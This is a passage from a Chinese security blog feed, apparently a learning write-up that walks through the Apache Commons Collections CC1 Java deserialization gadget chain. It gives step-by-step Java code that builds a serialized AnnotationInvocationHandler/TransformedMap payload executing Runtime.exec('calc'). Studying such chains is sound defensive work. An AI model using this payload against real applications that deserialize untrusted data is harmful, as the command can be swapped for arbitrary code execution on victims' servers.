Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, null, chainedTransformer);  </span><br><span class="line">        Class c= Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);  </span><br><span class="line">        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);  </span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(true);  </span><br><span class="line">        Object o = annotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);  </span><br><span class="line">        return o;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>弹出计算器</p><img src="/2025/07/20/RMI/3.png" class="">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;远程方法调用&lt;br&gt;结构简单分为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;客户端&lt;/li&gt;
&lt;li&gt;客户端注册中心&lt;/li&gt;
&lt;li&gt;服务端&lt;/li&gt;
&lt;li&gt;服务端注册中心&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;调用要求&quot;&gt;&lt;a href=&quot;#调用要求&quot; class=&quot;headerl</summary>
      
    
    
    
    <category term="Java_Security" scheme="https://usingns.github.io/categories/Java-Security/"/>
    
    
    <category term="Java" scheme="https://usingns.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>CC1链</title>
    <link href="https://usingns.github.io/2025/07/17/CC1%E9%93%BE/"/>
    <id>https://usingns.github.io/2025/07/17/CC1%E9%93%BE/</id>
    <published>2025-07-17T09:23:34.000Z</published>
    <updated>2025-07-17T10:01:25.546Z</updated>
    
    <content type="html"><![CDATA[<p>这个是之前学过一点的，但是当时只是基于理论而没有动手实践，就像在看政治知识点，一段时间就忘记了，这次系统的来学一下，我本想是和上一期一样进行链条梳理一遍，但是发现那样就只能知道链条可以这么打，但是这是怎么来，为什么要这么打的问题就没法得到解决，所以还是正面来一遍吧。</p><h1 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h1><h2 id="什么是Apache-Commons"><a href="#什么是Apache-Commons" class="headerlink" title="什么是Apache Commons"></a>什么是Apache Commons</h2><pre><code>Apache Commons是Apache软件基金会的项目，Commons的目的是提供可重用的，开源的代码。Apache Commons提供了很多工具类库，他们几乎不依赖其他的第三方的类库，接口稳定，集成简单，可以大大提高编码效率和代码质量。当中有一个组件Apache Commons Collections，封装了Java的java.util.Collection相关类对象。详情见官网:https://commons.apache.org/</code></pre><h2 id="Apache-Commons-Collections"><a href="#Apache-Commons-Collections" class="headerlink" title="Apache Commons Collections"></a>Apache Commons Collections</h2><pre><code>Apache Commons Collections 是对java.util.Collection的扩展。目前Collections包有两个commons-collections和commons-collections4,commons-collections最新的版本是3.2.2，不支持泛型，目前官方已经不在维护。cc4目前的最新版本是4.4，最低要求Java8以上。相对于cc来说完全支持Java8的特性并且支持泛型，该版本无法兼容旧版本，为了避免冲突改名为cc4</code></pre><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>JDK:8u65(&lt;71)<br>sun包:<a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</a><br>Maven依赖:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;  </span><br><span class="line">  &lt;dependency&gt;      </span><br><span class="line">  &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line">      &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line">      &lt;version&gt;3.2.1&lt;/version&gt;  </span><br><span class="line">  &lt;/dependency&gt;  </span><br><span class="line">  &lt;dependency&gt;    </span><br><span class="line">  &lt;groupId&gt;junit&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;junit&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;4.13.2&lt;/version&gt;  </span><br><span class="line">    &lt;scope&gt;test&lt;/scope&gt;  </span><br><span class="line">  &lt;/dependency&gt;&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><h1 id="简单演示利用过程"><a href="#简单演示利用过程" class="headerlink" title="简单演示利用过程"></a>简单演示利用过程</h1><p>在一切准备工作都完成之后，我们就可以着手准备了(终于可以开始了，泪目…本人本机环境一塌糊涂，搞环境搞了三个小时，我宣布本人成为IEDA的忠实拥趸<del>bushi</del>)</p><p>首先准备一份，可以序列化和反序列化的的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">package com.example;  </span><br><span class="line">  </span><br><span class="line">import org.junit.Test;  </span><br><span class="line">import java.io.*;  </span><br><span class="line">  </span><br><span class="line">public class CCTest &#123;  </span><br><span class="line">    public static void serialize(Object obj) throws Exception&#123;  </span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    public static Object unserialize(String filename) throws Exception&#123;  </span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));  </span><br><span class="line">        Object obj = ois.readObject();  </span><br><span class="line">        return obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    @Test  </span><br><span class="line">    public void test() throws Exception&#123;  </span><br><span class="line">        unserialize(&quot;cc1.ser&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用yso工具生成恶意文件，在本机上小小一试，直接成功</p><img src="/2025/07/17/CC1%E9%93%BE/1.png" class=""><h1 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h1><p><mark>tips:记得查找用法的时候打开在所有位置中查找,同时在目录外部库右键打开源设置，设置好你的源路径，如果有新包加入记得增添上源路径</mark>.</p><h2 id="利用链子"><a href="#利用链子" class="headerlink" title="利用链子"></a>利用链子</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">AbstractInputCheckedMapDecorator.MapEntry.setValue()</span><br><span class="line">TransformedMap.checkSetValue()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">Method.invoke(&quot;Runtime.exec()&quot;,&quot;calc&quot;)</span><br></pre></td></tr></table></figure><p>在上一章有提到过，能够实现反序列化漏洞的链子有两个必要条件，一个是这个入口类实现了序列化接口并且需要重写类似readObject()这样的危险方法，另一个就是某些参数可控。</p><p><mark>这次的探究思路是往回找</mark></p><h2 id="调用流程"><a href="#调用流程" class="headerlink" title="调用流程"></a>调用流程</h2><img src="/2025/07/17/CC1%E9%93%BE/2.png" class=""><h2 id="Transformer接口"><a href="#Transformer接口" class="headerlink" title="Transformer接口"></a>Transformer接口</h2><p>我也不想机械降神的，但是我在学习的时候，学习先后是这样的，看看我后面有没有办法更自然地引出吧。</p><p>不过解释倒是也能解释，就是我想要找之前说的能够满足那两个条件的接口类，还真让我找到了(兴奋)，大概这样</p><p><mark>org.apache.commons.collextions.Transformer</mark></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">public interface Transformer &#123;  </span><br><span class="line">  </span><br><span class="line">    /**  </span><br><span class="line">     * Transforms the input object (leaving it unchanged) into some output object.     *     * @param input  the object to be transformed, should be left unchanged  </span><br><span class="line">     * @return a transformed object  </span><br><span class="line">     * @throws ClassCastException (runtime) if the input is the wrong class  </span><br><span class="line">     * @throws IllegalArgumentException (runtime) if the input is invalid  </span><br><span class="line">     * @throws FunctorException (runtime) if the transform cannot be completed  </span><br><span class="line">     */    public Object transform(Object input);  </span><br><span class="line">  //对传入对象进行一个加工处理</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们看有哪些实现类</p><img src="/2025/07/17/CC1%E9%93%BE/3.png" class=""><p>发现有很多，在其中有一个叫做InvokeTransformer的类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public Object transform(Object input) &#123;  </span><br><span class="line">    if (input == null) &#123;  </span><br><span class="line">        return null;  </span><br><span class="line">    &#125;  </span><br><span class="line">    try &#123;  </span><br><span class="line">        Class cls = input.getClass();  </span><br><span class="line">        Method method = cls.getMethod(iMethodName, iParamTypes);  </span><br><span class="line">        return method.invoke(input, iArgs);  </span><br><span class="line">              </span><br><span class="line">    &#125; catch (NoSuchMethodException ex) &#123;  </span><br><span class="line">        throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;);  </span><br><span class="line">    &#125; catch (IllegalAccessException ex) &#123;  </span><br><span class="line">        throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;);  </span><br><span class="line">    &#125; catch (InvocationTargetException ex) &#123;  </span><br><span class="line">        throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键在这一部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">try &#123;  </span><br><span class="line"> //通过反射调用传入对象的方法和方法参数</span><br><span class="line">    Class cls = input.getClass();  </span><br><span class="line">    Method method = cls.getMethod(iMethodName, iParamTypes);  </span><br><span class="line">    return method.invoke(input, iArgs);  </span><br><span class="line">          </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然如此那我们就看看这些变量参数都是从哪里传来的，点击它进行搜索 </p><p>发现很多构造函数，其中发现一个符合的，在类初始化构造的时候被传入进来，并进行赋值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;  </span><br><span class="line">    super();  </span><br><span class="line">    iMethodName = methodName;  </span><br><span class="line">    iParamTypes = paramTypes;  </span><br><span class="line">    iArgs = args;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那我们就试试传参，看看能否实现<br>这是我们最后一步要执行的Runtime.getRuntime().exec(“calc”); </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">package com.example;  </span><br><span class="line">  </span><br><span class="line">import org.junit.Test;  </span><br><span class="line">  </span><br><span class="line">import java.io.IOException;  </span><br><span class="line">  </span><br><span class="line">public class CC1Test &#123;  </span><br><span class="line">    @Test  </span><br><span class="line">    public void invokerExec() throws IOException &#123;  </span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2025/07/17/CC1%E9%93%BE/4.png" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class CC1Test &#123;  </span><br><span class="line">    @Test  </span><br><span class="line">    public void invokerExec() throws IOException &#123;  </span><br><span class="line">        //Runtime.getRuntime().exec(&quot;calc&quot;);  </span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer(  </span><br><span class="line">                &quot;exec&quot;,  </span><br><span class="line">                new Class[]&#123;String.class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;calc&quot;&#125;  </span><br><span class="line">        );  </span><br><span class="line">        invokerTransformer.transform(Runtime.getRuntime());  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>确实可以<br>所以我们的环节倒推找到了调用出口</p><img src="/2025/07/17/CC1%E9%93%BE/5.png" class=""><p>那就要再进一步找谁调用了这个InvokerTranformer的tranform方法，那我们可以查找一下谁使用了tranform，注意这里找最底层的更容易实现，筛选结果更少，这里还要注意不要找不同类transform()方法调用InvokerTransformer类的transform()方法，这种情况就是transform()方法再去调用transform()方法，没有意义，我们是想要回到某个类的readObject()方法，如上情况永远回不去。(<a href="https://blog.csdn.net/Jayjay___/article/details/133621214">https://blog.csdn.net/Jayjay___/article/details/133621214</a>)</p><img src="/2025/07/17/CC1%E9%93%BE/6.png" class=""><p>有很多结果，我们直接说找到能用的</p><p>TransformedMap这个类下面有一个<mark>checkSetValue</mark>方法使用了tranform方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">protected Object checkSetValue(Object value) &#123;  </span><br><span class="line">    return valueTransformer.transform(value);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们要使得valueTransformer的值是我们已经探索出来的InvokrTransformer，于是找找这个valueTransformer是从哪里被赋值的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;  </span><br><span class="line">    super(map);  </span><br><span class="line">    this.keyTransformer = keyTransformer;  </span><br><span class="line">    this.valueTransformer = valueTransformer;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现有一个叫做TransformedMap的构造方法可以进行赋值，但是这个类型是保护protected，也就是只能从内部访问，那怎么办呢，只能再去看看是哪里调用的这个TransformedMap</p><p><mark>当然，做这些都有一个前提，那就是已经确定这些都实现了序列化接口</mark></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;  </span><br><span class="line">    return new TransformedMap(map, keyTransformer, valueTransformer);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现是有一个公开静态的方法decorate可以给TransformedMap实例化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;  </span><br><span class="line">    return new TransformedMap(map, keyTransformer, valueTransformer);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那就不得不去试一试了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@Test  </span><br><span class="line">public void invokerExec2() throws IOException &#123;  </span><br><span class="line">    InvokerTransformer invokerTransformer = new InvokerTransformer(  </span><br><span class="line">            &quot;exec&quot;,  </span><br><span class="line">            new Class[]&#123;String.class&#125;,  </span><br><span class="line">            new Object[]&#123;&quot;calc&quot;&#125;  </span><br><span class="line">    );  </span><br><span class="line">    Map decorate = TransformedMap.decorate(null, null, invokerTransformer);  </span><br><span class="line">    //然后再想办法调用它的checkSetValue  </span><br><span class="line">    TransformedMap.checkSetValue ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后你在构造到这里的时候突然一愣，怎么我的checkSetValue没有自动补充？<br>这时你恍然大悟，原来checkSetValue也是protected方法，怎么办呢？如法炮制，再去看看哪里调用了这个方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">static class MapEntry extends AbstractMapEntryDecorator &#123;  </span><br><span class="line">  </span><br><span class="line">    /** The parent map */  </span><br><span class="line">    private final AbstractInputCheckedMapDecorator parent;  </span><br><span class="line">  </span><br><span class="line">    protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123;  </span><br><span class="line">        super(entry);  </span><br><span class="line">        this.parent = parent;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    public Object setValue(Object value) &#123;  </span><br><span class="line">        value = parent.checkSetValue(value);  </span><br><span class="line">        return entry.setValue(value);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现在MapEntry类中的setValue()方法调用了checkSetValue()<br>也就是调用MapEntry的setValue的时候就会调用parent.checkSetValue(value)</p><p>所以我们接下来要做两件事<br>一件传入MapEntry.setVale的Object value值Runtime.getRuntime()<br>另一件是通过decorate给TransformedMap.valueTransformer赋值成之前已经构造好的invokerTransformer对象</p><p>做好这两个之后，每次MapEntry.setVale就等同于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invokerTransformer.transform(Runtime.getRuntime());</span><br></pre></td></tr></table></figure><p>那么我们就尝试构造<br>decorate需要三个参数一个map，两个transformer，最后一个transformer要是我们已经构造好的invokerTransformer</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();  </span><br><span class="line">map.put(&quot;a&quot;, &quot;b&quot;);  </span><br><span class="line">Map&lt;Object,Object&gt; decorated = TransformedMap.decorate(map, null, invokerTransformer);</span><br></pre></td></tr></table></figure><p>那怎么调用decorate之后的map.setValue呢<br>遍历实体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();  </span><br><span class="line">map.put(&quot;a&quot;, &quot;b&quot;);  </span><br><span class="line">Map&lt;Object,Object&gt; decorated = TransformedMap.decorate(map, null, invokerTransformer);  </span><br><span class="line">for (Map.Entry&lt;Object, Object&gt; entry : decorated.entrySet()) &#123;  </span><br><span class="line">    System.out.println(entry);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">a=b</span><br><span class="line">也就是键值对成为了一个实体，对他进行setValue操作</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@Test  </span><br><span class="line">public void invokerExec2() throws IOException &#123;  </span><br><span class="line">    InvokerTransformer invokerTransformer = new InvokerTransformer(  </span><br><span class="line">            &quot;exec&quot;,  </span><br><span class="line">            new Class[]&#123;String.class&#125;,  </span><br><span class="line">            new Object[]&#123;&quot;calc&quot;&#125;  </span><br><span class="line">    );  </span><br><span class="line">    HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();  </span><br><span class="line">    map.put(&quot;a&quot;, &quot;b&quot;);  </span><br><span class="line">    Map&lt;Object,Object&gt; decorated = TransformedMap.decorate(map, null, invokerTransformer);  </span><br><span class="line">    for (Map.Entry&lt;Object, Object&gt; entry : decorated.entrySet()) &#123;  </span><br><span class="line">        entry.setValue(Runtime.getRuntime());  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>成功弹出计算器</p><img src="/2025/07/17/CC1%E9%93%BE/7.png" class=""><p>所以又提前了一步</p><img src="/2025/07/17/CC1%E9%93%BE/8.png" class=""><p>接下来就要找谁调用我们的map.setValue()并且自己重写了readObject()并且执行了map.setValue()并且实现了序列化，符合这些要求的就可以成为我们的出口类。真的有吗？是的，兄弟，真的有一个</p><img src="/2025/07/17/CC1%E9%93%BE/9.png" class=""><p>我们再去看看他是怎么回事<br>首先我们需要把之前代码里写的遍历的map传进memberValues</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;  </span><br><span class="line">    String name = memberValue.getKey();  </span><br><span class="line">    Class&lt;?&gt; memberType = memberTypes.get(name);  </span><br><span class="line">    if (memberType != null) &#123;  // i.e. member still exists  </span><br><span class="line">        Object value = memberValue.getValue();  </span><br><span class="line">        if (!(memberType.isInstance(value) ||  </span><br><span class="line">              value instanceof ExceptionProxy)) &#123;  </span><br><span class="line">            memberValue.setValue(  </span><br><span class="line">                new AnnotationTypeMismatchExceptionProxy(  </span><br><span class="line">                    value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(  </span><br><span class="line">                        annotationType.members().get(name)));  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123;  </span><br><span class="line">    private final Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//同时发现是在构造方法里面进行的赋值</span><br><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;  </span><br><span class="line">    Class&lt;?&gt;[] superInterfaces = type.getInterfaces();  </span><br><span class="line">    if (!type.isAnnotation() ||  </span><br><span class="line">        superInterfaces.length != 1 ||  </span><br><span class="line">        superInterfaces[0] != java.lang.annotation.Annotation.class)  </span><br><span class="line">        throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);  </span><br><span class="line">    this.type = type;  </span><br><span class="line">    this.memberValues = memberValues;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这个问题解决了，我们发现他这个类和构造方法都不是public的，也就是说不能够外部实例化，同样需要反射进行赋值，传入参数前一个是注解后一个是Map</p><p>尝试构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@Test  </span><br><span class="line">public void invokerExec3() throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;  </span><br><span class="line">    InvokerTransformer invokerTransformer = new InvokerTransformer(  </span><br><span class="line">            &quot;exec&quot;,  </span><br><span class="line">            new Class[]&#123;String.class&#125;,  </span><br><span class="line">            new Object[]&#123;&quot;calc&quot;&#125;  </span><br><span class="line">    );  </span><br><span class="line">    HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();  </span><br><span class="line">    map.put(&quot;a&quot;, &quot;b&quot;);  </span><br><span class="line">    Map&lt;Object,Object&gt; decorated = TransformedMap.decorate(map, null, invokerTransformer);  </span><br><span class="line">  </span><br><span class="line">    Class&lt;?&gt; clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);  </span><br><span class="line">    Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);  </span><br><span class="line">    constructor.setAccessible(true);  </span><br><span class="line">    Object o = constructor.newInstance(Target.class, decorated);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来我们怎么调用这个类AnnotationInvocationHandler的readObject()方法呢<br>他的readObject()是私有的，显然是反序列化的时候调用，那把什么反序列呢？显然，我们还需要对他序列化一次，构造如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">@Test  </span><br><span class="line">public void invokerExec3() throws Exception &#123;  </span><br><span class="line">    InvokerTransformer invokerTransformer = new InvokerTransformer(  </span><br><span class="line">            &quot;exec&quot;,  </span><br><span class="line">            new Class[]&#123;String.class&#125;,  </span><br><span class="line">            new Object[]&#123;&quot;calc&quot;&#125;  </span><br><span class="line">    );  </span><br><span class="line">    HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();  </span><br><span class="line">    map.put(&quot;a&quot;, &quot;b&quot;);  </span><br><span class="line">    Map&lt;Object,Object&gt; decorated = TransformedMap.decorate(map, null, invokerTransformer);  </span><br><span class="line">  </span><br><span class="line">    Class&lt;?&gt; clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);  </span><br><span class="line">    Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);  </span><br><span class="line">    constructor.setAccessible(true);  </span><br><span class="line">    Object o = constructor.newInstance(Target.class, decorated);  </span><br><span class="line">    //之前写的代码，简单进行的序列化和反序列化</span><br><span class="line">    CCTest.serialize(o);  </span><br><span class="line">    CCTest.unserialize(&quot;ser.bin&quot;);  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以打个断点，看看o不ok是否执行到了readObject<br>是ok的<br>所以看看怎么执行到memberValue.getValue()的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 